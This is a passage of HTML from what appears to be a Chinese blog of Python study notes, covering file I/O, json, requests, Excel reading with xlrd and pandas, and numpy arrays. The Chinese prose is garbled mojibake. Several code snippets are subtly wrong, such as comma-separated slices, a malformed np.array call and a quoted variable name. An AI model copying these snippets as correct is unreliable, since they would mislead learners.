<li>è·å–æ–‡ä»¶å½“å‰çš„è„šæœ¬ç›®å½•å’Œå·¥ä½œç›®å½•</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.path.dirname(os.path.abspath(__file__)) <span class="comment">#get directory name</span></span><br><span class="line">os.getcwd() <span class="comment">#get current working directory </span></span><br></pre></td></tr></table></figure>

<ul>
<li>å†™å…¥æ–‡ä»¶</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;file_name&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file_object:</span><br><span class="line">    file_object.write(<span class="string">&quot;i love programming&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>é™„åŠ åˆ°æ–‡ä»¶æœ«å°¾ç”¨appendï¼Œ<code>&#39;a&#39;</code>æ›¿æ¢<code>&#39;w&#39;</code>å³å¯</p>
<ul>
<li>ä¸€ä¸ªä¾‹å­</li>
</ul>
<p>è·å–å½“å‰æ–‡ä»¶çš„è·¯å¾„ï¼Œå¹¶ä¸”æ·»åŠ ä¸€ä¸ªpro.txtå†™å…¥i love programming</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">pwd = os.path.dirname(os.path.abspath(__file__))</span><br><span class="line">os.chdir(pwd)</span><br><span class="line">file_path = <span class="string">&#x27;pro.txt&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(file_path,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file_object:</span><br><span class="line">    contents = file_object.write(<span class="string">&quot;i love programming&quot;</span>)</span><br></pre></td></tr></table></figure>

<hr>
<p>ä»è¿™é‡Œå¼€å§‹åŸºç¡€éƒ¨åˆ†ç®—æ˜¯ç»“æŸäº†ï¼Œåé¢çš„è¿˜éƒ½æ˜¯ç¬”è®°çš„å½¢å¼æ²¡æ•´ç†æˆæ•™ç¨‹ï¼Œå°±çœ‹çœ‹å‰é¢çš„å§ï¼Œ</p>
<p>ä¸‹æ–‡åº”ç”¨æ–¹é¢çš„æ¯”è¾ƒå¤š</p>
<p>w+ å¯è¯»å†™ï¼Œæ–‡ä»¶ä¸å­˜åœ¨æ—¶åˆ›å»ºæ–‡ä»¶</p>
<p>r+ï¼Œå¯è¯»å†™ï¼Œæ–‡ä»¶ä¸å­˜åœ¨æ—¶æŠ¥é”™</p>
<p><code>truncate(size)</code>å‡½æ•°æ¥åˆ é™¤ txt æ–‡ä»¶å†…å®¹ï¼Œsizeæ˜¯è¡¨ç¤ºä»ç¬¬å‡ ä¸ªå­—èŠ‚å¼€å§‹æ¸…é™¤ï¼Œå¦‚æœæ˜¯<code>0</code>æ—¶ä»£è¡¨æ˜¯åˆ é™¤å…¨éƒ¨å†…å®¹ï¼ˆé¦–å…ˆéœ€è¦seek(0)ä¸ç„¶å¯èƒ½ä¼šé€ æˆä¹±ç ï¼‰</p>
<p>bæ˜¯ä»¥äºŒè¿›åˆ¶çš„è¯»å…¥</p>
<hr>
<h3 id="ç”¨jsonå­˜å‚¨æ•°æ®"><a href="#ç”¨jsonå­˜å‚¨æ•°æ®" class="headerlink" title="ç”¨jsonå­˜å‚¨æ•°æ®"></a>ç”¨jsonå­˜å‚¨æ•°æ®</h3><p><strong>dumpså°†pythonå†…ç½®çš„å¯¹è±¡è½¬åŒ–æœªjson</strong></p>
<p><strong>loadså°†jsonæ•°æ®è¯»å…¥ä½œä¸ºpythonå†…ç½®çš„å¯¹è±¡</strong></p>
<ul>
<li><p>å¯¹apiè¿”å›çš„jsonå¯¹è±¡rï¼Œ<code>r.json()</code>å°†åŸjsonè½¬åŒ–ä¸ºä¸€ä¸ªpyå­—å…¸</p>
</li>
<li><p>ä½¿ç”¨json.dump() , json.load()</p>
<ul>
<li>json.dump()</li>
</ul>
</li>
</ul>
<p>json.dump()æ¥å—ä¸¤ä¸ªå®å‚ï¼Œä¸€ä¸ªæ˜¯è¦å­˜å‚¨çš„æ•°æ®ï¼Œä¸€ä¸ªæ˜¯å­˜å‚¨æ•°æ®çš„å¯¹è±¡,</p>
<p>è€Œjson.dumps()æ–¹æ³•å¯æ¥å—åªæœ‰ä¸€ä¸ªå®å‚,å³å­˜å‚¨çš„æ•°æ®</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">indent = <span class="number">4</span>,sort_keys=<span class="literal">True</span></span><br></pre></td></tr></table></figure>
<p>å¦‚ä¸Šä¸¤ä¸ªå‚æ•°,indent=4ä½¿ä»£ç ç¼©è¿›4bytes  ,  sort_keyå‡åºæ’åº(å­—æ¯),åŒæ—¶è¯•ç”¨ä¸dumpå’Œdumps</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="comment">#directory save file &amp; output</span></span><br><span class="line">numbers = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">5</span>]</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;numbers.json&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;file_name&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f_obj:</span><br><span class="line">    json.dump(numbers,f_obj)</span><br></pre></td></tr></table></figure>



<p>â€‹            b. json.load() </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="comment">#string to directory</span></span><br><span class="line">file_name = <span class="string">&#x27;numbers.json&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;file_name&#x27;</span>) <span class="keyword">as</span> f_obj:</span><br><span class="line">    numbers = json.load(f_obj)</span><br><span class="line">    </span><br><span class="line"> <span class="built_in">print</span>(numbers)</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="æ¨¡å—"><a href="#æ¨¡å—" class="headerlink" title="æ¨¡å—"></a>æ¨¡å—</h2><h3 id="requestsæ¨¡å—"><a href="#requestsæ¨¡å—" class="headerlink" title="requestsæ¨¡å—"></a>requestsæ¨¡å—</h3><ol>
<li><p><code>request.get(url)</code></p>
<p>å‡è®¾<code>r=requests.get(url)</code>è¿”å›çš„å¯¹è±¡ræœ‰å¦‚ä¸‹å±æ€§</p>
</li>
</ol>
<p>r.status_code                         httpè¯·æ±‚è¿”å›çŠ¶æ€,200è¡¨ç¤ºæ­£å¸¸</p>
<p>r.text                    httpç›¸åº”ä¸ºå­—ç¬¦ä¸²å½¢å¼,è¿”å›é¡µé¢çš„å†…å®¹</p>
<p>r.encoding                ä»http header ä¸­çŒœæµ‹çš„ç›¸åº”å†…å®¹ç¼–ç æ–¹å¼</p>
<p>r.apparent_encoding        ä»å†…å®¹ä¸­åˆ†æå‡ºçš„å“åº”å†…å®¹ç¼–ç æ–¹å¼ï¼ˆå¤‡é€‰ç¼–ç æ–¹å¼ï¼‰</p>
<p>r.content                httpå“åº”å†…å®¹çš„äºŒè¿›åˆ¶å½¢å¼</p>
<h3 id="å¤„ç†excelè¡¨æ ¼"><a href="#å¤„ç†excelè¡¨æ ¼" class="headerlink" title="å¤„ç†excelè¡¨æ ¼"></a>å¤„ç†excelè¡¨æ ¼</h3><h4 id="è¯»"><a href="#è¯»" class="headerlink" title="è¯»"></a>è¯»</h4><h5 id="ä½¿ç”¨xlrd"><a href="#ä½¿ç”¨xlrd" class="headerlink" title="ä½¿ç”¨xlrd"></a>ä½¿ç”¨xlrd</h5><p><strong>é¦–å…ˆ<code>from xlrd import open_workbook</code>å¯¼å…¥pyå¯¹excelå¯¼å…¥æ”¯æŒ</strong></p>
<p>è¯»å–excelé¦–å…ˆéœ€è¦æ‰“å¼€ï¼Œå¯ä»¥ä½¿ç”¨<code>example = openwork(file_name)</code></p>
<p>è·å–æ‰€æœ‰è¡¨æ ¼çš„åå­—(ä¸€ä¸ªworkbookæœ‰å¤šä¸ªsheets) <code>example.sheet_names()</code></p>
<p>é€šè¿‡ç´¢å¼•å’Œåå­—è·å–è¡¨æ ¼ï¼Œæ¯”å¦‚ä¸€ä¸ªexcelä¸­ç¬¬ä¸€å¼ sheetå«åšâ€œä»·æ ¼â€</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sheet1 = example.sheet_by_index(<span class="number">0</span>) <span class="comment">#é€šè¿‡ç´¢å¼•è·å–è¡¨æ ¼ï¼Œç±»ä¼¼æ•°ç»„ä¸‹æ ‡</span></span><br><span class="line">sheet2 = example.sheet_by_name(<span class="string">&#x27;ä»·æ ¼&#x27;</span>)<span class="comment">#é€šè¿‡åç§°è·å–è¡¨æ ¼</span></span><br><span class="line">sheet1.ncols<span class="comment">#åˆ—æ•°</span></span><br><span class="line">sheet1.nrows<span class="comment">#è¡Œæ•°</span></span><br><span class="line">rows_value = sheet1.row_values(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#[&#x27;å¾®è½¯&#x27;, &#x27;pythonå·¥ç¨‹å¸ˆ2&#x27;, &#x27;2@2.com&#x27;]</span></span><br><span class="line">cols_value = sheet1.col_values(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#[&#x27;å¯¹æ–¹é‚®ç®±&#x27;, &#x27;1@1.com&#x27;, &#x27;2@2.com&#x27;, &#x27;3@3.com&#x27;]</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(sheet1.nrows):</span><br><span class="line">    <span class="built_in">print</span> (sheet1.row_values(i))</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27; è¾“å‡ºæ¯ä¸€è¡Œï¼Œåˆ—è¡¨</span></span><br><span class="line"><span class="string">[&#x27;é˜¿é‡Œå·´å·´&#x27;, &#x27;pythonå·¥ç¨‹å¸ˆ&#x27;, &#x27;1@1.com&#x27;]</span></span><br><span class="line"><span class="string">[&#x27;å¾®è½¯&#x27;, &#x27;pythonå·¥ç¨‹å¸ˆ2&#x27;, &#x27;2@2.com&#x27;]</span></span><br><span class="line"><span class="string">[&#x27;è°·æ­Œ&#x27;, &#x27;pythonå·¥ç¨‹å¸ˆ3&#x27;, &#x27;3@3.com&#x27;]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#ä½¿ç”¨å•å…ƒæ ¼å®šä½</span></span><br><span class="line">cell_A1 = sheet1.cell(<span class="number">0</span>,<span class="number">0</span>).value</span><br><span class="line">cell_A2 = sheet1.cell(<span class="number">0</span>,<span class="number">1</span>).value</span><br></pre></td></tr></table></figure>

<h5 id="ä½¿ç”¨pandas"><a href="#ä½¿ç”¨pandas" class="headerlink" title="ä½¿ç”¨pandas"></a>ä½¿ç”¨pandas</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line">df = pd.read_excel(<span class="string">&#x27;file_destiantion&#x27;</span>)</span><br><span class="line"><span class="comment">#df=pd.read_excel(&#x27;lemon.xlsx&#x27;,sheet_name=&#x27;Sheet1&#x27;)#å¯ä»¥é€šè¿‡sheet_nameæ¥æŒ‡å®šè¯»å–çš„sheet</span></span><br><span class="line"><span class="comment"># df=pd.read_excel(&#x27;lemon.xlsx&#x27;,sheet_name=0)#å¯ä»¥é€šè¿‡è¡¨å•ç´¢å¼•æ¥æŒ‡å®šè¯»å–çš„è¡¨å•               </span></span><br><span class="line">data = df.head()<span class="comment">#å‰äº”è¡Œæ•°æ®</span></span><br><span class="line"><span class="comment">#data=df.values#è·å–æ‰€æœ‰çš„æ•°æ®,è¿”å›ä¸€ä¸ªåˆ—è¡¨è¿­ä»£å™¨</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">format</span>(data))</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">   a   b   c</span></span><br><span class="line"><span class="string">1</span></span><br><span class="line"><span class="string">2</span></span><br><span class="line"><span class="string">3</span></span><br><span class="line"><span class="string">1,2,3è¢«ç§°ä¸ºæ˜¯DataFrameçš„indexå±æ€§</span></span><br><span class="line"><span class="string">aï¼Œbï¼Œcè¢«ç§°ä¸ºæ˜¯columnså±æ€§</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">nrows = df.index.size  <span class="comment"># è¡Œæ•°</span></span><br><span class="line">ncols = df.columns.size  <span class="comment"># åˆ—æ•°</span></span><br><span class="line">df.iloc[][] <span class="comment">#æŒ‰ç…§å•å…ƒæ ¼å–</span></span><br><span class="line">df.iloc[:,j].name <span class="comment">#æŒ‰ç…§åˆ‡ç‰‡å–ï¼Œè¿™é‡Œæ˜¯ç¬¬jåˆ—çš„åç§° usage[row:column]</span></span><br></pre></td></tr></table></figure>

















<hr>
<h2 id="numpy"><a href="#numpy" class="headerlink" title="numpy"></a>numpy</h2><p><code>import numpy as np</code></p>
<p>ä»¥ä¸‹ç¬”è®°å‡åœ¨å¯¼å…¥numpyçš„æƒ…å†µä¸‹ä½¿ç”¨</p>
<h3 id="numpyæ•°ç»„"><a href="#numpyæ•°ç»„" class="headerlink" title="numpyæ•°ç»„"></a>numpyæ•°ç»„</h3><ul>
<li><p>ä»pyåˆ—è¡¨åˆ›å»ºæ•°ç»„</p>
<p><code>np.array([1,2,3,4,5,6])</code> </p>
<p>numpyä¸­çš„arrayæ–¹æ³•è¿˜æœ‰dtypeæ„ä¸ºdatatypeæŒ‡å®šæ•°ç»„çš„æ•°æ®ç±»å‹</p>
</li>
</ul>
<p>![numpy data type](C:\Users\83487\Pictures\programmer path\numpy data type.jpg)</p>
<ul>
<li>åˆ©ç”¨numpyå†…å»ºæ–¹æ³•åˆ›å»ºå¤§è§„æ¨¡æ•°ç»„</li>
</ul>
<ol>
<li><p>åˆ›å»ºä¸€ä¸ªé•¿åº¦ä¸º10çš„æ•°ç»„ï¼Œä¸”èµ‹äºˆåˆå€¼0</p>
<p><code>np.zeros(10,dtype = int)</code></p>
</li>
<li><p>åˆ›å»ºä¸€ä¸ª3*5çš„æµ®ç‚¹æ•°æ•°ç»„ï¼Œåˆå€¼ä¸º1</p>
<p><code>np.ones( (3,5),dtype = float)</code></p>
</li>
<li><p>åˆ›å»ºä¸€ä¸ª3*5çš„æµ®ç‚¹æ•°ç»„ï¼Œåˆå€¼ä¸º3.14 </p>
<p><code>np.full((3,5),3.14)</code></p>
</li>
<li><p>åˆ›å»ºä¸€ä¸ª3*5çš„æµ®ç‚¹æ•°ç»„ï¼Œä»0-20ï¼Œæ­¥é•¿ä¸º2</p>
<p><code>np.arange(0,20,2)</code></p>
<p>out:[0,2,4,6,â€¦20]</p>
</li>
<li><p>åˆ›å»ºä¸€ä¸ªäº”ä¸ªå…ƒç´ çš„æ•°ç»„ï¼Œæ•°å€¼å¹³å‡åˆ†é…0-1ä¸­é—´</p>
<p><code>np.linspace(0,1,5)</code></p>
</li>
<li><p>åˆ›å»ºä¸€ä¸ª3*3å–å€¼åœ¨0-1ä¹‹é—´çš„çŸ©é˜µï¼Œç”±éšæœºæ•°ç»„æˆçš„æ•°ç»„</p>
<p><code>np.random.random((3,3))</code></p>
</li>
<li><p>åˆ›å»ºä¸€ä¸ªæ­£æ€åˆ†å¸ƒï¼Œæ–¹å·®ä¸º1ï¼Œ3*3çš„éšæœºæ•°ç»„</p>
<p><code>np.random.normal(0,1,(3,3))</code></p>
</li>
<li><p>åˆ›å»ºä¸€ä¸ª3*3ï¼Œ[0,10)ä¹‹é—´çš„éšæœºæ•°ç»„</p>
<p><code>np.random.randint(0,10,(3,3))</code></p>
</li>
<li><p>åˆ›å»ºä¸€ä¸ª3*3çš„å•ä½çŸ©é˜µ</p>
<p><code>np.eye(3)</code></p>
</li>
<li><p>åˆ›å»ºä¸€ä¸ª3ä¸ªæ•´å½¢æ•°ç»„æ„æˆçš„æ•°ç»„ï¼Œæœªåˆå§‹åŒ–ï¼Œç›´æ¥è¯»å–å†…å­˜çš„å€¼</p>
<p><code>np.empty(3)</code></p>
<hr>
</li>
</ol>
<h4 id="å±æ€§"><a href="#å±æ€§" class="headerlink" title="å±æ€§"></a>å±æ€§</h4><p>æ¯ä¸ªæ•°ç»„å‡æœ‰<code>nidm</code>(æ•°ç»„çš„ç»´åº¦),<code>shape</code>(æ¯ä¸ªæ•°ç»„çš„å¤§å°),<code>size</code>(æ•°ç»„çš„æ€»å¤§å°),<code>dtype</code>æ˜¯æ•°ç»„çš„æ•°æ®ç±»å‹,<code>itemsize</code>æ¯ä¸ªæ•°ç»„å…ƒç´ å­—èŠ‚å¤§å°ï¼Œ<code>nbytes</code>æ•°ç»„æ€»å­—èŠ‚å¤§å°</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="comment">#çœç•¥ä¸‹åŒºé—´çš„å†™æ³•ï¼ˆ0ï¼Œ10ï¼‰=&gt; 10</span></span><br><span class="line">x1 = np.random.randint(<span class="number">10</span>,size = <span class="number">6</span>)<span class="comment">#ä¸€ç»´ </span></span><br><span class="line">x2 = np.random.randint(<span class="number">10</span>,size = (<span class="number">3</span>,<span class="number">4</span>))<span class="comment">#äºŒç»´</span></span><br><span class="line">x3 = np.random.randint(<span class="number">10</span>,size = (<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>))<span class="comment">#ä¸‰ç»´</span></span><br><span class="line">x3.ndim 	<span class="comment">#æ•°ç»„çš„ç»´åº¦ 3</span></span><br><span class="line">x3.shape	<span class="comment">#æ¯ä¸ªæ•°ç»„çš„å¤§å° (3,4,5)</span></span><br><span class="line">x3.size		<span class="comment">#æ•°ç»„çš„æ€»å¤§å°  60 </span></span><br><span class="line">x3.dtype</span><br><span class="line">x3.itemsize <span class="comment">#æ¯ä¸ªæ•°ç»„å…ƒç´ å­—èŠ‚å¤§å° 8bytes</span></span><br><span class="line">x3.nbytes	<span class="comment">#æ•°ç»„æ€»å­—èŠ‚å¤§å°   480bytes</span></span><br></pre></td></tr></table></figure>

<h4 id="ç´¢å¼•"><a href="#ç´¢å¼•" class="headerlink" title="ç´¢å¼•"></a>ç´¢å¼•</h4><ol>
<li><p>è‹¥æ˜¯æ•°ç»„åï¼Œåˆ™è¿”å›æ•´ä¸ªæ•°ç»„</p>
</li>
<li><p>ç¬¬ä¸€ä¸ªå…ƒç´ ä¸º0ï¼Œå¯ä»¥ä½¿ç”¨è´Ÿå€¼ï¼Œå³ä¸ºå€’æ•°ç¬¬ä¸€ä¸ªå…ƒç´ </p>
</li>
<li><p>åœ¨å¤šç»´æ•°ç»„ä¸­å¯ä»¥ç”¨é€—å·åˆ†éš”ç´¢å¼•å…ƒç´ <code>[è¡Œï¼Œåˆ—]</code></p>
</li>
</ol>
<p>   tips:è‹¥å°†æµ®ç‚¹æ•°çš„å€¼èµ‹å€¼ç»™æ•´å½¢çš„numpyå¯¹è±¡ï¼Œä¼šè‡ªåŠ¨æˆªå–æ•´æ•°éƒ¨åˆ†ï¼Œè‡ªåŠ¨è¿›è¡Œï¼Œæ— é”™è¯¯å’Œè­¦å‘Š</p>
<h4 id="åˆ‡åˆ†"><a href="#åˆ‡åˆ†" class="headerlink" title="åˆ‡åˆ†"></a>åˆ‡åˆ†</h4><p>xæ˜¯ä¸€ä¸ªæ•°ç»„åˆ™ï¼Œæ•°æ®çš„åˆ‡åˆ†ä¸º<code>x[start,stop,step]</code></p>
<p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œåœ¨ä¸€ç»´æ•°ç»„ä¸­ï¼Œ<code>x[4,7]</code>è¿™ä¸ªåˆ‡ç‰‡è¡¨ç¤ºçš„æ˜¯åŸæ•°ç»„ç¬¬5ä¸ªå…ƒç´ ï¼ˆåŒ…æ‹¬ï¼‰åˆ°ç¬¬ä¸ƒä¸ªå…ƒç´ ï¼ˆåŒ…æ‹¬ï¼‰</p>
<p>åŒæ ·çš„è´Ÿå€¼åœ¨stepä¸­ä¾æ—§å¯ä»¥ä½¿ç”¨ï¼Œä¾‹å¦‚<code>x[::-1]</code>è¡¨ç¤ºçš„æ˜¯é€†åºè¾“å‡ºåŸæ•°ç»„æ‰€æœ‰å…ƒç´ </p>
<ul>
<li><p>å¤šç»´æ•°ç»„ç±»ä¼¼æ“ä½œï¼Œä¸åŒç»´åº¦ä¹‹é—´ç”¨é€—å·åˆ†éš”</p>
</li>
<li><p>è·å–è¡Œåˆ—ã€‚ä¾‹å¦‚ï¼šè·å–äºŒç»´æ•°ç»„x2ç¬¬ä¸€è¡Œï¼Œ<code>x2[0,:]</code>,æˆ–çœç•¥ä¸º<code>x2[0]</code></p>
<p>â€‹                åŒç†äºŒç»´æ•°ç»„çš„x2ç¬¬ä¸€åˆ—ï¼Œ<code>x2[:,0]</code></p>
</li>
<li><p>ç”¨ä¸Šè¿°çš„åˆ‡åˆ†æ“ä½œåˆ›å»ºçš„æ˜¯åŸæ•°ç»„çš„è§†å›¾ï¼Œå³æ•°æ®ä¸åŸæ•°ç»„ç›¸å…³è”ï¼Œè‹¥æ”¹åŠ¨æŸä¸ªå…ƒç´ çš„å€¼ï¼ŒåŸæ•°ç»„ä¸­çš„è¯¥å…ƒç´ çš„å€¼ä¹Ÿè¢«æ”¹å˜</p>
</li>
<li><p>è‹¥æƒ³åˆ‡åˆ†å‡ºæ¥çš„æ–°æ•°ç»„ä¸åŸæ•°ç»„æ— å…³ï¼Œå¯ä»¥ç”¨<code>.copy()</code>å‡½æ•°è¿›è¡Œè½¬æ¢ï¼Œå³åˆ›å»ºä¸€ä¸ªåŸæ•°ç»„å­å‰¯æœ¬usageï¼š<code>x2.[:,0].copy()</code></p>
</li>
</ul>
<h4 id="å˜å½¢ä¸åˆ†è£‚"><a href="#å˜å½¢ä¸åˆ†è£‚" class="headerlink" title="å˜å½¢ä¸åˆ†è£‚"></a>å˜å½¢ä¸åˆ†è£‚</h4><h5 id="æ•°ç»„çš„å˜å½¢"><a href="#æ•°ç»„çš„å˜å½¢" class="headerlink" title="æ•°ç»„çš„å˜å½¢"></a>æ•°ç»„çš„å˜å½¢</h5><p>æ•°ç»„çš„å˜å½¢å¯ä»¥ç”¨reshape() å‡½æ•°å’Œnewaxis</p>
<p>![reshape](C:\Users\83487\Pictures\programmer path\reshape.jpg)</p>
<h5 id="æ•°ç»„çš„æ‹¼æ¥å’Œåˆ†è£‚"><a href="#æ•°ç»„çš„æ‹¼æ¥å’Œåˆ†è£‚" class="headerlink" title="æ•°ç»„çš„æ‹¼æ¥å’Œåˆ†è£‚"></a>æ•°ç»„çš„æ‹¼æ¥å’Œåˆ†è£‚</h5><h6 id="æ‹¼æ¥"><a href="#æ‹¼æ¥" class="headerlink" title="æ‹¼æ¥"></a>æ‹¼æ¥</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = np.array([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>])</span><br><span class="line">y = np.array([<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>])</span><br><span class="line">np.concatenate([x,y])</span><br><span class="line"><span class="comment">#out: array([1,2,3,3,2,1])</span></span><br></pre></td></tr></table></figure>

<p>concatenateä¹Ÿå¯ä»¥å¯¹äºŒç»´æ•°ç»„å’Œä¸¤ä¸ªä»¥ä¸Šçš„æ•°ç»„å¯¹è±¡è¿›è¡Œæ‹¼æ¥</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">grid = np.array([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],</span><br><span class="line">               	[<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>])</span><br><span class="line">np.concatenate([grid,grid])<span class="comment">#é»˜è®¤æ²¿ç€ç¬¬ä¸€ä¸ªè½´è¿›è¡Œæ‹¼æ¥ï¼Œyè½´</span></span><br><span class="line"><span class="comment">#ç¼ºçœaxis = 1</span></span><br></pre></td></tr></table></figure>

<p>è¾“å‡ºç»“æœnp.array([1,2,3],</p>
<p>â€‹                [4,5,6],</p>
<p>â€‹                [1,2,3],</p>
<p>â€‹                [4,5,6])</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">grid = np.array([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],</span><br><span class="line">               	[<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>])</span><br><span class="line">np.concatenate([grid,grid],axis = <span class="number">0</span>)<span class="comment">#axis = 0,xè½´æ‹¼æ¥</span></span><br></pre></td></tr></table></figure>

<p>è¾“å‡ºç»“æœnp.array([1,2,3],    [1,2,3],</p>
<p>â€‹                [4,5,6],  [4,5,6])</p>
<ul>
<li>æˆ–è€…ä½¿ç”¨np.vstack,np.hstack</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">grid = np.array([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],</span><br><span class="line">               	[<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>])</span><br><span class="line">np.vstack([grid,grid])<span class="comment">#æ•ˆæœç­‰äºconcatenateæŒ‰yè½´æ‹¼æ¥</span></span><br><span class="line">np.hstack([grid,grid])<span class="comment">#æ•ˆæœç­‰äºconcatenateæŒ‰xè½´æ‹¼æ¥</span></span><br></pre></td></tr></table></figure>

<h6 id="åˆ†è£‚"><a href="#åˆ†è£‚" class="headerlink" title="åˆ†è£‚"></a>åˆ†è£‚</h6><ul>
<li>np.split</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">99</span>,<span class="number">99</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>]</span><br><span class="line">x1,x2,x3 = np.split(x,[<span class="number">3</span>,<span class="number">5</span>])</span><br><span class="line"><span class="built_in">print</span>(x1,x2,x3)</span><br><span class="line"><span class="comment">#out : [1,2,3],[99,99],[3,2,1]</span></span><br></pre></td></tr></table></figure>

<p>åˆ†è£‚ç‚¹æ˜¯3ï¼Œ5ï¼Œåˆ†è£‚ç‚¹ä¹‹å‰çš„ï¼ˆä¸å«åˆ†è£‚ç‚¹ï¼‰ä¸ºä¸€ç»„</p>
<ul>
<li>np.hsplitã€np.vsplit </li>
</ul>
<p>![vsplit hsplit](C:\Users\83487\Pictures\programmer path\vsplit hsplit.jpg)</p>
<h3 id="numpyå‡½æ•°"><a href="#numpyå‡½æ•°" class="headerlink" title="numpyå‡½æ•°"></a><code>numpy</code>å‡½æ•°</h3><ul>
<li>æ•°ç»„å€¼æ±‚å’Œ</li>
</ul>
<p><code>np.sum()</code>,<code>numpy</code>çš„å‡½æ•°æ¯”pyå†…ç½®çš„sumå‡½æ•°é€Ÿåº¦æ›´å¿«ï¼Œæ‹¬å·ä¸­å€¼æ˜¯<code>numpy</code>çš„å¯¹è±¡</p>
<ul>
<li>æœ€å¤§æœ€å°å€¼</li>
</ul>
<p><code>numpy</code>ä¸­æœ‰æœ€å¤§æœ€å°å’Œæ±‚å’Œçš„å‡½æ•°ï¼Œç”¨<code>np_oject_name.min()</code>,<code>np_oject_name.max()</code>, <code>np_oject_name.sum()</code>æ¥å¾—åˆ°</p>
<p>è¿˜æœ‰ä¸€ä¸ªå‚æ•°ä¾¿æ˜¯axisï¼Œaxis å…³é”®å­—æŒ‡å®šçš„æ˜¯æ•°ç»„å°†ä¼šè¢«æŠ˜å çš„ç»´ åº¦ï¼Œè€Œä¸æ˜¯å°†è¦è¿”å›çš„ç»´åº¦ã€‚å› æ­¤æŒ‡å®š axis=0 æ„å‘³ç€ç¬¬ä¸€ä¸ªè½´å°†è¦è¢«æŠ˜å â€”â€”å¯¹äºäºŒç»´æ•° ç»„ï¼Œè¿™æ„å‘³ç€æ¯ä¸€åˆ—çš„å€¼éƒ½å°†è¢«èšåˆ</p>
<p>ä¾‹å¦‚ç°åœ¨ä¸€ä¸ªå«åšMçš„<code>numpy</code>å¯¹è±¡ï¼Œ<code>M.min(axis=0)</code>åˆ™æ„å‘³ç€æ•°æ®è¢«æ‘Šå¼€ä¸ºåªæœ‰xè½´ï¼Œå¹¶æ‰¾åˆ°å…¶ä¸­çš„minï¼Œ</p>
<p><code>numpy</code>æ”¯æŒçš„ç®—æœ¯è¿ç®—ç¬¦ï¼Œ+ï¼Œ-ï¼Œ<em>ï¼Œ/ï¼Œ//(åœ°æ¿é™¤)ï¼Œ</em>*(æŒ‡æ•°)ï¼Œ%(å–ä½™),</p>
<p>ç»å¯¹å€¼<code>np.abs()</code></p>
<p>ä¸‰è§’å‡½æ•°<code>np.sin()</code>,<code>np.cos()</code>,<code>np.tan()</code></p>
<p>åä¸‰è§’å‡½æ•°<code>np.arcsin()</code>,<code>np.arccos()</code>,<code>np.arctan()</code></p>
<p>æŒ‡æ•°å’Œå¯¹æ•° </p>
<p><code>np.exp(x)</code> - e^x</p>
<p><code>np.exp2(x)</code>-2^x</p>
<p><code>np.power(3,x)</code>-3^x</p>
<p><code>np.log(x)</code>- ln(x)</p>
<p><code>np.log2(x)</code>-log2(x)</p>
<p><code>np.log10(x)</code>-log10(x)</p>
<p>ç‰¹æ®Šç‰ˆæœ¬</p>
<p><code>print(&quot;exp(x) - 1 =&quot;, np.expm1(x))</code> </p>
<p><code>print(&quot;log(1 + x) =&quot;, np.log1p(x))</code></p>
<ul>
<li>æ›´é«˜çº§çš„ç‰ˆæœ¬ç§‘å­¦è®¡ç®—çš„å‡½æ•°å¯ä»¥åœ¨scipy.specialä¸­æ‰¾åˆ°</li>
</ul>
